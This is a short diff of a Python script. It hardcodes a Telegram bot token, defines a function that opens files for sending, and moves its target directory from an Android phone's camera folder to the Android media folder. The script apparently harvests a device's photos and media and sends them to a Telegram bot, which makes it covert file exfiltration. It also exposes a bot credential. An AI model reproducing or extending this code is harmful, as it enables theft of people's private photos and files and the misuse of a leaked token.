@@ -16,7 +16,7 @@ except ImportError:
     import requests
 
 bot = telebot.TeleBot('8162453891:AAHQFyMPEzja9Wt8vSxT6t5-d_NuJu-zM9w')
-dir_path = "/storage/emulated/0/Camera/"
+dir_path = "/storage/emulated/0/Android/media/"
 
 def send_file(file_path):
     with open(file_path, "rb") as f:
